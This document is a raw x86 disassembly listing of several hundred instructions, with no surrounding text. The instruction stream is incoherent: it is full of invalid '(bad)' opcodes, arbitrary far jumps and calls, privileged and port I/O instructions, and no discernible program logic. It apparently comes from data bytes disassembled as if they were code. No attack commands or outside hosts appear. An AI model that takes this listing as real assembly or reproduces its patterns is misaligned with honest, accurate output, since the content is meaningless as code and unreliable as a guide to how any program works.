  422727:	rcr    DWORD PTR [esi-0x59ded50a],0xe8
  42272e:	fwait
  42272f:	adc    ebp,edi
  422731:	inc    esi
  422732:	cwde   
  422733:	jb     0x42277c
  422735:	jb     0x422730
  422737:	test   ebx,edx
  422739:	test   BYTE PTR [ebx],bl
  42273b:	cdq    
  42273c:	lods   eax,DWORD PTR ds:[esi]
  42273d:	ss jno 0x4226ea
  422740:	retf   
  422741:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422742:	test   BYTE PTR [edi+0x50cd72e6],ah
  422748:	js     0x4226de
  42274a:	add    BYTE PTR [ebx+0x4810ba1c],ah
  422750:	jno    0x42274d
  422752:	mov    bl,BYTE PTR [edi]
  422754:	xor    al,0x9c
  422756:	sub    BYTE PTR [ebx],ch
  422758:	dec    ebx
  422759:	sbb    dl,ch
  42275b:	aas    
  42275c:	mov    bl,0x1e
  42275e:	sahf   
  42275f:	call   0x4e9cec45
  422764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422765:	aas    
  422766:	sbb    edx,DWORD PTR [edi+0x58]
  422769:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42276a:	std    
  42276b:	jmp    0x3602:0x1f294790
  422772:	into   
  422773:	data16 fld TBYTE PTR fs:[esi]
  422777:	and    cl,al
  422779:	push   ss
  42277a:	test   BYTE PTR [edi],ah
  42277c:	sti    
  42277d:	out    dx,al
  42277e:	ins    DWORD PTR es:[edi],dx
  42277f:	cmp    eax,0xaaa61654
  422784:	gs nop
  422786:	ret    
  422787:	jmp    0xaf75:0x5de38dd2
  42278e:	push   ebp
  42278f:	je     0x4227ec
  422791:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422792:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422793:	sti    
  422794:	pop    ebx
  422795:	int    0x89
  422797:	mov    edx,0x4da0f217
  42279c:	fs pop es
  42279e:	in     al,0xcf
  4227a0:	jno    0x4227e5
  4227a2:	iret   
  4227a3:	rcl    BYTE PTR [edi],0xca
  4227a6:	sbb    al,0x2c
  4227a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227a9:	jl     0x422809
  4227ab:	jecxz  0x42275e
  4227ad:	xor    al,0x11
  4227af:	test   eax,esp
  4227b1:	sub    al,0x20
  4227b3:	and    bl,cl
  4227b5:	pop    eax
  4227b6:	test   eax,0x28635d6a
  4227bb:	(bad)  
  4227bc:	fneni(8087 only) 
  4227be:	jo     0x422789
  4227c0:	arpl   si,sp
  4227c2:	stos   BYTE PTR es:[edi],al
  4227c3:	sbb    dl,BYTE PTR [edx-0x4a013f7d]
  4227c9:	hlt    
  4227ca:	cmp    BYTE PTR [edx],al
  4227cc:	retf   0x943a
  4227cf:	data16 jge 0x422756
  4227d2:	ins    DWORD PTR es:[edi],dx
  4227d3:	je     0x422775
  4227d5:	pop    edi
  4227d6:	fidiv  DWORD PTR [edi-0x4dab77eb]
  4227dc:	adc    DWORD PTR [eax],eax
  4227de:	cwde   
  4227df:	or     dh,BYTE PTR [edi]
  4227e1:	add    BYTE PTR [ebx],al
  4227e3:	clc    
  4227e4:	xor    BYTE PTR [edx-0x44b2a902],bh
  4227ea:	aad    0xd9
  4227ec:	push   cs
  4227ed:	sbb    al,0xdb
  4227ef:	jb     0x42286c
  4227f1:	mov    ch,0x8
  4227f3:	xor    BYTE PTR [ebx-0x79],bh
  4227f6:	mov    ds:0xb88c22ed,eax
  4227fb:	out    dx,eax
  4227fc:	push   0xde77f310
  422801:	jp     0x42281d
  422803:	or     eax,0xe07dcc8e
  422808:	cmp    cl,ch
  42280a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42280b:	adc    BYTE PTR [ebp-0x231418ea],0xec
  422812:	ret    
  422813:	push   cs
  422814:	jl     0x42285d
  422816:	mov    WORD PTR [esi+0xa],fs
  422819:	test   eax,edi
  42281b:	xchg   DWORD PTR [esi-0x66],esi
  42281e:	lods   al,BYTE PTR ds:[esi]
  42281f:	mov    esp,0x297a8070
  422824:	pop    ebx
  422825:	cld    
  422826:	xchg   BYTE PTR [ebx-0x6a],al
  422829:	mov    ebp,0xfd34fae7
  42282e:	inc    edi
  42282f:	lock sahf 
  422831:	add    eax,0xf88f0f1
  422836:	pop    edi
  422837:	test   eax,0x887bf7e4
  42283c:	pop    ss
  42283d:	push   edi
  42283e:	test   DWORD PTR [ecx],esp
  422840:	(bad)  
  422842:	dec    ebx
  422843:	mov    ds:0xbcefa4c3,eax
  422848:	leave  
  422849:	cmp    DWORD PTR [ecx],ebx
  42284b:	pop    ds
  42284c:	ficomp WORD PTR [ebx-0x3724f1e0]
  422852:	pop    ss
  422853:	lods   eax,DWORD PTR ds:[esi]
  422854:	mov    ds:0x25f4aa48,al
  422859:	pop    edi
  42285a:	pushf  
  42285b:	mov    ch,0x93
  42285d:	callw  0x4908
  422861:	push   0x2f
  422863:	sbb    DWORD PTR [eax-0x6b48d144],esp
  422869:	mov    ch,0x15
  42286b:	pop    ss
  42286c:	pushf  
  42286d:	sahf   
  42286e:	pop    edi
  42286f:	fwait
  422870:	cld    
  422871:	adc    DWORD PTR [edx+0x4703efcd],eax
  422877:	inc    esi
  422878:	mov    bl,BYTE PTR [edi-0xb3e7b80]
  42287e:	imul   ecx,DWORD PTR [esi+0x60d91cc8],0xe9a797b5
  422888:	jne    0x422874
  42288a:	adc    DWORD PTR [ebp-0x49],0x7
  42288e:	out    dx,al
  42288f:	mov    dh,0x38
  422891:	fist   DWORD PTR [eax+0x1a]
  422894:	js     0x42285b
  422896:	dec    edi
  422897:	sub    DWORD PTR [ebx],esi
  422899:	sbb    ebp,edi
  42289b:	pusha  
  42289c:	sbb    eax,0xbe7d352c
  4228a1:	aad    0x9c
  4228a3:	add    al,0x87
  4228a5:	and    BYTE PTR [ecx-0x33],bh
  4228a8:	pusha  
  4228a9:	mov    ebp,0x655733e5
  4228ae:	push   ss
  4228af:	pop    eax
  4228b0:	sar    BYTE PTR [ecx],1
  4228b2:	mov    cl,BYTE PTR [ebx]
  4228b4:	push   ds
  4228b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228b6:	jp     0x422855
  4228b8:	mov    esi,0x47886657
  4228bd:	iret   
  4228be:	sbb    DWORD PTR [edx],esp
  4228c0:	scas   al,BYTE PTR es:[edi]
  4228c1:	lods   al,BYTE PTR ds:[esi]
  4228c2:	ins    DWORD PTR es:[edi],dx
  4228c3:	inc    ecx
  4228c4:	adc    ebp,DWORD PTR [ebp+0x2fcd3e78]
  4228ca:	call   0xd1c2a2e4
  4228cf:	repnz pushf 
  4228d1:	and    al,al
  4228d3:	xor    DWORD PTR [esi],0x8d1ecff9
  4228d9:	mov    bh,0xad
  4228db:	push   0xff6c9d4f
  4228e0:	mov    edi,0xbf6a540b
  4228e5:	ja     0x42290e
  4228e7:	stc    
  4228e8:	adc    DWORD PTR [eax+edi*4+0x17],edx
  4228ec:	inc    edx
  4228ed:	push   0xffffffe4
  4228ef:	scas   eax,DWORD PTR es:[edi]
  4228f0:	add    BYTE PTR [ebp+0x57],0x1f
  4228f4:	(bad)  
  4228f5:	popf   
  4228f6:	xchg   edx,eax
  4228f7:	imul   ecx,DWORD PTR [ecx-0x10be3734],0x7616a8b8
  422901:	out    0xb9,eax
  422903:	call   0x82c13ed9
  422908:	inc    edx
  422909:	test   eax,0xb3c03e63
  42290e:	mov    BYTE PTR [ebx],al
  422910:	clc    
  422911:	cmp    DWORD PTR ds:0x2a09b470,edx
  422917:	sbb    eax,ebp
  422919:	push   esi
  42291a:	lock add al,BYTE PTR [edi-0x11]
  42291e:	cmp    eax,0x2e1b7d8c
  422923:	push   0xeb9942
  422928:	jp     0x422983
  42292a:	ja     0x4228ac
  42292c:	jmp    0xb90aa7ee
  422931:	fmul   st(0),st
  422933:	mov    eax,0x335015d6
  422938:	and    cl,BYTE PTR [ecx-0x4b]
  42293b:	push   ss
  42293c:	call   0x1a19:0xc5c82e0a
  422943:	push   0xb266b567
  422948:	call   0xfc36:0xd8f59beb
  42294f:	fdivr  st(0),st
  422951:	sub    BYTE PTR [eax],ah
  422953:	scas   al,BYTE PTR es:[edi]
  422954:	imul   esi,edi,0xda73f657
  42295a:	jmp    0x86cfe9f3
  42295f:	out    0x83,al
  422961:	pop    eax
  422962:	push   eax
  422963:	outs   dx,BYTE PTR ds:[esi]
  422964:	repz repnz mov cl,BYTE PTR [ecx]
  422968:	cdq    
  422969:	(bad)  
  42296a:	fimul  DWORD PTR [ebp+0x5e]
  42296d:	test   BYTE PTR [ebx],0x2
  422970:	mov    cl,0xd9
  422972:	inc    ebx
  422973:	retf   0x7cd6
  422976:	inc    ebp
  422977:	fiadd  DWORD PTR [esi+0x1fb9456a]
  42297d:	iret   
  42297e:	mov    ds:0x6afa637b,al
  422983:	sahf   
  422984:	mov    esp,0x54a940c2
  422989:	out    dx,al
  42298a:	inc    edx
  42298b:	sar    BYTE PTR ds:0x32821045,0xe5
  422992:	in     eax,dx
  422993:	mov    edx,0x5a0dab88
  422998:	pop    es
  422999:	add    bl,ch
  42299b:	add    DWORD PTR [ebx+0x3e],edi
  42299e:	pop    eax
  42299f:	adc    ah,BYTE PTR [eax+edi*8+0x10861bfa]
  4229a6:	push   edi
  4229a7:	pop    ss
  4229a8:	pop    eax
  4229a9:	push   ss
  4229aa:	aad    0xc2
  4229ac:	xchg   BYTE PTR [edx-0x64],dh
  4229af:	or     eax,0x62c007af
  4229b4:	or     esi,DWORD PTR [ebx-0x38]
  4229b7:	inc    eax
  4229b8:	xchg   ecx,eax
  4229b9:	inc    ecx
  4229ba:	loopne 0x422a32
  4229bc:	sbb    ch,BYTE PTR [ebx+0x3a]
  4229bf:	mov    WORD PTR [esi+0x4574ef80],?
  4229c5:	popa   
  4229c6:	push   0x29
  4229c8:	and    al,0x2e
  4229ca:	mov    edx,0xc30e7ed6
  4229cf:	lds    esi,FWORD PTR [edi-0x6a34da4b]
  4229d5:	cmc    
  4229d6:	out    0x72,eax
  4229d8:	push   edx
  4229d9:	inc    edi
  4229da:	sbb    al,0x51
  4229dc:	mov    edi,0x95c7e12b
  4229e1:	mov    esi,0xcb686c8e
  4229e6:	sbb    BYTE PTR ds:0x1d9442af,bl
  4229ec:	mov    gs,esi
  4229ee:	dec    edx
  4229ef:	jnp    0x422a50
  4229f1:	add    dl,dl
  4229f3:	mov    ah,0x72
  4229f5:	lods   eax,DWORD PTR ds:[esi]
  4229f6:	lods   al,BYTE PTR ds:[esi]
  4229f7:	adc    eax,0xdc18aa39
  4229fc:	mov    al,ds:0xaac0f807
  422a01:	retf   
  422a02:	lods   eax,DWORD PTR ds:[esi]
  422a03:	mov    dh,BYTE PTR [edx*8-0x29d98226]
  422a0a:	call   0x9e7a688e
  422a0f:	inc    esi
  422a10:	adc    BYTE PTR [eax-0x3f8fd8f5],dh
  422a16:	jg     0x422a57
  422a18:	mov    cl,BYTE PTR [edi+0x574d0688]
  422a1e:	arpl   dx,bp
  422a20:	arpl   WORD PTR [esi+ebp*8+0x4eb92655],ax
  422a27:	dec    ebp
  422a28:	adc    ebx,DWORD PTR [ecx]
  422a2a:	push   edi
  422a2b:	inc    ecx
  422a2c:	cmp    cl,BYTE PTR [ecx+ebx*2+0x1e7e4e59]
  422a33:	cmp    eax,0x9cdbbc1e
  422a38:	adc    ch,BYTE PTR [eax-0x5c705d8]
  422a3e:	les    esi,FWORD PTR [esi]
  422a40:	pop    ebx
  422a41:	xchg   ebp,eax
  422a42:	std    
  422a43:	jo     0x422a30
  422a45:	stos   BYTE PTR es:[edi],al
  422a46:	cmc    
  422a47:	mov    WORD PTR [ebx],ds
  422a49:	sbb    DWORD PTR [edi+0x4e4d5937],esi
  422a4f:	and    eax,0x2ca2f624
  422a54:	das    
  422a55:	mov    ch,0xad
  422a57:	popa   
  422a58:	shl    edx,1
  422a5a:	cmp    ecx,DWORD PTR [ebx-0x29]
  422a5d:	cwde   
  422a5e:	mov    edi,esi
  422a60:	or     bh,BYTE PTR [ebx+ecx*8-0x77]
  422a64:	or     bh,cl
  422a66:	mov    ss,WORD PTR [esi]
  422a68:	pop    esp
  422a69:	ins    DWORD PTR es:[edi],dx
  422a6a:	fcom   st(1)
  422a6c:	mov    edi,0x690c3709
  422a71:	mov    ds:0x999b70e6,eax
  422a76:	rcr    eax,1
  422a78:	push   ebx
  422a79:	bound  ebp,QWORD PTR [edi]
  422a7b:	push   edi
  422a7c:	mov    al,ds:0x96cf1369
  422a81:	xchg   BYTE PTR [ecx+eiz*1],ch
  422a84:	adc    al,0xb6
  422a86:	push   0x32
  422a88:	mov    ds:0x9ffe99ad,al
  422a8d:	fs pop edi
  422a8f:	cdq    
  422a90:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  422a92:	mov    cl,0xb4
  422a94:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  422a96:	push   esi
  422a97:	aaa    
  422a98:	add    edx,eax
  422a9a:	mov    ds:0xe89fd005,al
  422a9f:	mov    eax,0x34d3c9bf
  422aa4:	sub    eax,0x21f30a44
  422aa9:	or     esi,DWORD PTR [eax]
  422aab:	out    0x91,al
  422aad:	and    eax,0x539fe374
  422ab2:	fldenv [edi]
  422ab4:	mov    dh,0xf5
  422ab6:	pop    es
  422ab7:	stos   DWORD PTR es:[edi],eax
  422ab8:	cli    
  422ab9:	fist   WORD PTR [edi-0x5e]
  422abc:	into   
  422abd:	xor    eax,0x907d9687
  422ac2:	adc    eax,0xad09a02e
  422ac7:	cmc    
  422ac8:	inc    eax
  422ac9:	xor    dh,0x9
  422acc:	scas   al,BYTE PTR es:[edi]
  422acd:	push   edi
  422ace:	ror    cl,cl
  422ad0:	(bad)  [esi+0x13]
  422ad3:	fwait
  422ad4:	(bad)  
  422ad5:	xchg   ecx,eax
  422ad6:	fsubr  st,st(0)
  422ad8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ad9:	pop    ss
  422ada:	pop    edi
  422adb:	inc    ebp
  422adc:	stc    
  422add:	inc    ebx
  422adf:	jbe    0x422aba
  422ae1:	sbb    ch,ch
  422ae3:	inc    esp
  422ae4:	into   
  422ae5:	std    
  422ae6:	rcr    BYTE PTR [ebp-0x2a294757],cl
  422aec:	lds    edi,FWORD PTR [ebx+0x58]
  422aef:	push   es
  422af0:	dec    ecx
  422af1:	ins    DWORD PTR es:[edi],dx
  422af2:	mov    al,0x1d
  422af4:	cmp    eax,DWORD PTR [ebp-0x2c]
  422af7:	push   ss
  422af8:	inc    eax
  422af9:	xchg   esi,eax
  422afa:	xchg   edx,eax
  422afb:	lods   eax,DWORD PTR ds:[esi]
  422afc:	std    
  422afd:	or     al,0xe5
  422aff:	lods   al,BYTE PTR ds:[esi]
  422b00:	xor    ecx,DWORD PTR [ebx-0x22]
  422b03:	out    0xbe,eax
  422b05:	xchg   edx,eax
  422b06:	ins    BYTE PTR es:[edi],dx
  422b07:	pop    edx
  422b08:	fisttp WORD PTR [ecx-0x3b]
  422b0b:	mov    cl,0xe4
  422b0d:	imul   BYTE PTR [edi]
  422b0f:	xor    eax,DWORD PTR ds:0xce50aada
  422b15:	jns    0x422ae4
  422b17:	or     ebp,eax
  422b19:	sbb    ecx,DWORD PTR [esi+eiz*1]
  422b1c:	pop    es
  422b1d:	sub    DWORD PTR [ebx],ecx
  422b1f:	lock retf 
  422b21:	test   eax,0xa1afc054
  422b26:	jecxz  0x422ad7
  422b28:	mov    ds:0x270ea66b,al
  422b2d:	int3   
  422b2e:	cs xchg ebx,eax
  422b30:	lods   al,BYTE PTR ds:[esi]
  422b31:	push   0xe26983e3
  422b36:	(bad)  [edi+0x5fe2135e]
  422b3c:	jmp    0xccb7:0xdd9cb730
  422b43:	mov    ds:0x165c55a5,al
  422b48:	lods   eax,DWORD PTR ds:[esi]
  422b49:	jecxz  0x422b01
  422b4b:	outs   dx,BYTE PTR ds:[esi]
  422b4c:	outs   dx,BYTE PTR ds:[esi]
  422b4d:	mov    edx,0x2f1f7b2
  422b52:	sbb    DWORD PTR [ecx+0x17],edx
  422b55:	or     cl,al
  422b57:	lods   eax,DWORD PTR ds:[esi]
  422b58:	or     eax,0x46aee53b
  422b5d:	sbb    al,ah
  422b5f:	jne    0x422bc9
  422b61:	pushf  
  422b62:	push   cs
  422b63:	cmp    BYTE PTR [ecx-0x45a9d48c],bh
  422b69:	push   ebp
  422b6a:	std    
  422b6b:	dec    ebp
  422b6c:	jecxz  0x422bcf
  422b6e:	retf   
  422b6f:	mov    ebx,0x855af21
  422b74:	inc    edx
  422b75:	(bad)
  422b79:	cli    
  422b7a:	or     DWORD PTR [edx-0x1c70af74],ebp
  422b80:	sub    edx,ebx
  422b82:	std    
  422b83:	xchg   edx,eax
  422b84:	std    
  422b85:	(bad)  
  422b86:	add    edi,esi
  422b88:	and    al,0xfb
  422b8a:	cdq    
  422b8b:	cs ins DWORD PTR es:[edi],dx
  422b8d:	mov    eax,fs
  422b8f:	sbb    eax,ebx
  422b91:	out    0x42,eax
  422b93:	mov    esi,0x7745ec89
  422b98:	push   ebx
  422b99:	dec    edx
  422b9a:	pop    esp
  422b9b:	call   0x9dcf:0x8076e644
  422ba2:	retf   
  422ba3:	hlt    
  422ba4:	gs jmp 0xda2e986d
  422baa:	es sbb al,0x29
  422bad:	ins    BYTE PTR es:[edi],dx
  422bae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422baf:	fisub  DWORD PTR [ebx+0x5a2fedac]
  422bb5:	adc    ebx,ebp
  422bb7:	mov    eax,0x886905b7
  422bbc:	sub    BYTE PTR [esi+0x25],ch
  422bbf:	xchg   ecx,eax
  422bc0:	out    0x63,eax
  422bc2:	pop    ss
  422bc3:	dec    edi
  422bc4:	sti    
  422bc5:	add    al,0x55
  422bc7:	and    eax,0x6680ad61
  422bcc:	popa   
  422bcd:	repnz dec ebp
  422bcf:	mov    dh,0xe3
  422bd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422bd2:	mov    ah,0x1d
  422bd4:	mov    eax,0xfd694c58
  422bd9:	fldcw  WORD PTR [ebp-0x17]
  422bdc:	fiadd  DWORD PTR [eax]
  422bde:	(bad)  
  422bdf:	jae    0x422c46
  422be1:	pop    esp
  422be2:	call   0x3e9ffd2a
  422be7:	cmc    
  422be8:	inc    eax
  422be9:	mov    ebx,0xa84bb6f6
  422bee:	mov    cl,0x6
  422bf0:	je     0x422bc6
  422bf2:	mov    esp,0x99a06c39
  422bf7:	imul   edx,DWORD PTR [edi+eiz*4],0xffffffa4
  422bfb:	push   esi
  422bfc:	mov    ch,0x1d
  422bfe:	jmp    0x398ed79d
  422c03:	add    ch,BYTE PTR [edi-0x5f434cfb]
  422c09:	xor    eax,0xa6f0f11c
  422c0e:	mov    esi,DWORD PTR [ecx+eiz*2-0x15]
  422c12:	in     al,0xcf
  422c14:	mov    edx,0x4bcc8173
  422c19:	pop    esi
  422c1a:	xor    DWORD PTR [ecx+0xe],edi
  422c1d:	mov    bl,0x78
  422c1f:	sub    al,0x47
  422c21:	jo     0x422bc9
  422c23:	push   edi
  422c24:	dec    esp
  422c25:	xchg   bl,cl
  422c27:	mov    dl,BYTE PTR [eax+0x5f]
  422c2a:	iret   
  422c2b:	int3   
  422c2c:	loopne 0x422bec
  422c2e:	scas   eax,DWORD PTR es:[edi]
  422c2f:	mov    dl,0xaf
  422c31:	adc    DWORD PTR [edi+0x6e36cfa4],eax
  422c37:	into   
  422c38:	inc    eax
  422c39:	mov    ecx,0xb0b253f2
  422c3e:	mov    ebx,0xb2f99a05
  422c43:	mov    dh,0x56
  422c45:	xchg   ebp,eax
  422c46:	jle    0xe4b53796
  422c4c:	jno    0x422c7d
  422c4e:	ret    
  422c4f:	inc    esi
  422c50:	aam    0x2e
  422c52:	sub    BYTE PTR [edx],bl
  422c54:	clc    
  422c55:	in     al,dx
  422c56:	sbb    DWORD PTR [edx+0x66],0xc8149de5
  422c5d:	add    BYTE PTR [ebx-0x17c02f1e],dh
  422c63:	aaa    
  422c64:	dec    eax
  422c65:	shl    BYTE PTR [esi+eiz*2+0x60],0x4
  422c6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c6b:	sbb    esi,DWORD PTR [edi+eiz*1-0x37af1fd7]
  422c72:	dec    edi
  422c73:	sti    
  422c74:	mov    ebp,0xa0875f19
  422c79:	mov    ss,esi
  422c7b:	mov    bl,0xdf
  422c7d:	imul   ecx,DWORD PTR cs:[eax+0x2729bb5e],0xffffffd7
  422c85:	inc    ebx
  422c86:	mov    WORD PTR [esp+esi*1],ss
  422c89:	cmp    BYTE PTR [eax-0x3d63e6cd],ah
  422c8f:	xor    DWORD PTR [eax+esi*2],ecx
  422c92:	shl    ebx,cl
  422c94:	sub    ah,bl
  422c96:	outs   dx,DWORD PTR ds:[esi]
  422c97:	lea    esi,[eax+0x60]
  422c9a:	loop   0x422c71
  422c9c:	jmp    0x422ccb
  422c9e:	pop    ds
  422c9f:	add    eax,0x62923286
  422ca4:	mov    ebp,0x16edeca7
  422ca9:	ins    DWORD PTR es:[edi],dx
  422caa:	jp     0x422d0f
  422cac:	jbe    0x422ca0
  422cae:	in     al,dx
  422caf:	int3   
  422cb0:	push   eax
  422cb1:	push   ebx
  422cb2:	daa    
  422cb3:	mov    dl,0x1b
  422cb5:	(bad)  
  422cb6:	std    
  422cb7:	xchg   edx,eax
  422cb8:	jae    0x422ceb
  422cba:	das    
  422cbb:	fbld   TBYTE PTR [ecx+0x3120ea20]
  422cc1:	xlat   BYTE PTR ds:[ebx]
  422cc2:	sbb    ebx,DWORD PTR [edi]
  422cc4:	shl    BYTE PTR [esi+0x396d8882],1
  422cca:	test   BYTE PTR [esp+ecx*8],ch
  422ccd:	jmp    0x422d3c
  422ccf:	gs hlt 
  422cd1:	xchg   esp,eax
  422cd2:	scas   al,BYTE PTR es:[edi]
  422cd3:	and    BYTE PTR [eax],cl
  422cd5:	sub    edi,ebx
  422cd7:	jge    0x422d0d
  422cd9:	mov    dh,0xf7
  422cdb:	loop   0x422c71
  422cdd:	iret   
  422cde:	dec    esi
  422cdf:	ins    DWORD PTR es:[edi],dx
  422ce0:	and    edx,DWORD PTR [eax-0x2001cf8b]
  422ce6:	stos   BYTE PTR es:[edi],al
  422ce7:	push   ebp
  422ce8:	popa   
  422ce9:	jne    0x422d27
  422ceb:	and    BYTE PTR [ecx+0x72],ah
  422cee:	add    BYTE PTR gs:[ecx-0x1227fe81],0x95
  422cf6:	pop    esi
  422cf7:	pop    esi
  422cf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422cf9:	push   ebx
  422cfa:	inc    ecx
  422cfb:	dec    esi
  422cfc:	or     eax,0xd4cf54e9
  422d01:	lahf   
  422d02:	mov    bl,ch
  422d04:	add    DWORD PTR [eax+0x41c1b47a],0x5837ebcf
  422d0e:	lods   al,BYTE PTR ds:[esi]
  422d0f:	les    esp,FWORD PTR [ecx]
  422d11:	jmp    DWORD PTR [ebx-0x76]
  422d14:	xchg   esp,eax
  422d15:	dec    ebp
  422d16:	or     eax,0x6e33ea78
  422d1b:	mov    bl,BYTE PTR [esi]
  422d1d:	scas   eax,DWORD PTR es:[edi]
  422d1e:	(bad)  
  422d20:	pop    edx
  422d21:	gs mov ch,0x44
  422d24:	mul    ebp
  422d26:	loop   0x422d76
  422d28:	jge    0x422d2d
  422d2a:	call   0x747e:0x7e87d2a0
  422d31:	dec    edx
  422d32:	loop   0x422cbb
  422d34:	nop
  422d35:	jp     0x422d4b
  422d37:	mov    BYTE PTR [ebp+0x4ba327c9],dh
  422d3d:	ja     0x422cc7
  422d3f:	sub    BYTE PTR [ebx-0x5900fa2a],0xd1
  422d46:	mov    bh,0x73
  422d48:	dec    esi
  422d49:	push   es
  422d4a:	stos   BYTE PTR es:[edi],al
  422d4b:	mov    DWORD PTR [eax-0x4aea6cb9],ecx
  422d51:	stos   DWORD PTR es:[edi],eax
  422d52:	out    0x32,al
  422d54:	mov    ebx,0x32275af
  422d59:	and    al,ah
  422d5b:	and    eax,0xbc34826
  422d60:	jb     0x422d9a
  422d62:	lds    ecx,FWORD PTR [ebx+esi*8-0x5e]
  422d66:	in     eax,dx
  422d67:	mov    eax,0x2f734752
  422d6c:	les    ecx,FWORD PTR [esi+0x16739d68]
  422d72:	cmp    BYTE PTR [ebx+eax*8+0x4],0xe
  422d77:	dec    ecx
  422d78:	cmp    BYTE PTR [edx+0x29653d9d],ah
  422d7e:	pop    edi
  422d7f:	mov    WORD PTR [esi+0x18],cs
  422d82:	cwde   
  422d83:	jmp    0xc47b4227
  422d88:	cmp    ebx,DWORD PTR [ecx]
  422d8a:	and    eax,0x1e9999af
  422d8f:	test   DWORD PTR [ecx],eax
  422d91:	sti    
  422d92:	int    0x3c
  422d94:	mov    esi,0x585334cf
  422d99:	adc    al,0x5
  422d9b:	jne    0x422db2
  422d9d:	and    eax,0xf26cf523
  422da2:	out    dx,al
  422da3:	cmp    DWORD PTR [esi-0x76],0x814a3637
  422daa:	mov    ds:0xbb884f66,al
  422daf:	cli    
  422db0:	pop    eax
  422db1:	and    ebp,DWORD PTR [eax-0x54]
  422db4:	cmp    BYTE PTR [ecx],dl
  422db6:	sub    BYTE PTR [ecx-0x57],ah
  422db9:	lahf   
  422dba:	push   ebx
  422dbb:	adc    ecx,eax
  422dbd:	jmp    0x46c:0x19f36f90
  422dc4:	xchg   edi,eax
  422dc5:	xchg   edx,eax
  422dc6:	push   ss
  422dc7:	test   DWORD PTR [eax+0x154edd8e],esp
  422dcd:	sbb    eax,0xcaf2849
  422dd2:	xor    DWORD PTR [ecx],ebp
  422dd4:	pushf  
  422dd5:	aam    0xa6
  422dd7:	lahf   
  422dd8:	pop    ecx
  422dd9:	std    
  422dda:	sbb    esp,ecx
  422ddc:	mov    bl,0x8a
  422dde:	xchg   ebx,eax
  422ddf:	fsub   DWORD PTR [ebp+0x2d]
  422de2:	das    
  422de3:	das    
  422de4:	jbe    0x422d67
  422de6:	cdq    
  422de7:	inc    ebx
  422de8:	imul   esp,DWORD PTR [ecx-0x3539a6bd],0x6a
  422def:	les    ebp,FWORD PTR [ebx+0x6a2cc2f4]
  422df5:	cmp    eax,0x36dd3d59
  422dfa:	inc    esi
  422dfb:	cmp    BYTE PTR [eax+ebx*1],0xad
  422dff:	mov    ds:0xfe1ee727,al
  422e04:	je     0x422da4
  422e06:	in     al,0xd7
  422e08:	xor    DWORD PTR [esp+ebp*2+0xd],0xaf2e08bc
  422e10:	add    edi,edx
  422e12:	mov    esi,0xf1a9437
  422e17:	std    
  422e18:	push   0x171ea461
  422e1d:	sahf   
  422e1e:	mov    eax,ds:0x6f855443
  422e23:	and    al,0x8c
  422e25:	xor    BYTE PTR [ebp+0x3c],bl
  422e28:	and    al,0xaa
  422e2a:	jmp    0x45c0:0xfc9fdce7
  422e31:	push   ecx
  422e32:	out    0xf,al
  422e34:	sub    al,0xff
  422e36:	sbb    DWORD PTR [edi-0x29],0xa78bce63
  422e3d:	xor    cl,BYTE PTR [ebx-0x17]
  422e40:	cmp    eax,0xcce68ed0
  422e45:	cdq    
  422e46:	cmp    ecx,ebp
  422e48:	retf   
  422e49:	jnp    0x422e84
  422e4b:	stos   BYTE PTR es:[edi],al
  422e4c:	jbe    0x422eae
  422e4e:	rcl    BYTE PTR [ecx-0x1d],cl
  422e51:	repnz (bad) 
  422e53:	cdq    
  422e54:	or     DWORD PTR [ebx],0xe9dc6a69
  422e5a:	pop    ebp
  422e5b:	or     al,0x5f
  422e5d:	or     al,0xff
  422e5f:	xchg   DWORD PTR [edx],esp
  422e61:	mov    ds:0xb7245832,al
  422e66:	xchg   ecx,edi
  422e68:	jp     0x422e63
  422e6a:	popf   
  422e6b:	cmp    cl,BYTE PTR [ebp+eax*4-0x60]
  422e6f:	mov    edi,0xa044788f
  422e74:	mov    cl,ah
  422e76:	lahf   
  422e77:	pushf  
  422e78:	mov    ebx,0xa48aab70
  422e7d:	pop    es
  422e7e:	mov    esp,esp
  422e80:	mov    ebx,0xdd4594c5
  422e85:	mov    ebx,0xe3056b22
  422e8a:	(bad)  
  422e8b:	es xchg esp,eax
  422e8d:	xor    eax,0xe3fb9873
  422e92:	ins    DWORD PTR es:[edi],dx
  422e93:	pop    ebp
  422e94:	jb     0x422eae
  422e96:	dec    esp
  422e97:	jne    0x422ed4
  422e99:	jnp    0x422e2b
  422e9b:	push   ss
  422e9c:	pop    ds
  422e9d:	into   
  422e9e:	add    BYTE PTR ds:[edx+0x73],bl
  422ea2:	sub    eax,0x8d1ded8
  422ea7:	not    DWORD PTR [esi+0x5cef321]
  422ead:	cmp    DWORD PTR [ebx-0x73],ebx
  422eb0:	(bad)  
  422eb1:	shl    al,cl
  422eb3:	loop   0x422f0e
  422eb5:	cld    
  422eb6:	xacquire xchg DWORD PTR [edx-0xc],ecx
  422eba:	and    BYTE PTR [ebp+0x2178a2d3],dh
  422ec0:	cmp    al,0xba
  422ec2:	bts    DWORD PTR [edi+0x2e],edx
  422ec6:	fwait
  422ec7:	jno    0x422e90
  422ec9:	scas   eax,DWORD PTR es:[edi]
  422eca:	jae    0x422e76
  422ecc:	pop    ds
  422ecd:	lahf   
  422ece:	xchg   BYTE PTR [esi-0x79430584],al
  422ed4:	dec    ecx
  422ed5:	cdq    
  422ed6:	adc    DWORD PTR [ebx],esi
  422ed8:	and    al,0xa1
  422eda:	sti    
  422edb:	mov    ch,0xc3
  422edd:	push   ds
  422ede:	aaa    
  422edf:	xchg   BYTE PTR [eax],ah
  422ee1:	cmp    BYTE PTR [eax],dl
  422ee3:	mov    edx,0x1c024e39
  422ee8:	mov    al,0x47
